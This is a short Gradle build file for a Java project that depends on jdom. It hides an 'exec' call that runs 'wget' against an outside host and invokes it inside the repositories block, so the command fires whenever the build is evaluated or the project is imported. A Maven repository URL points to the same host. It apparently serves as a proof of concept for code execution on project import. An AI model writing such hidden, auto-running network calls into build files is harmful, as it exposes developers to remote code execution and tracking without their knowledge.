apply plugin: 'java'

def test = { ->
    exec {
        commandLine "wget", "http://1231223.z.buglloc.com"
    }
}

repositories {
  maven {
    test()

    url 'http://test11.z.buglloc.com/'
  }
}

dependencies {

  compile 'org.jdom:jdom:1.1.3'
}
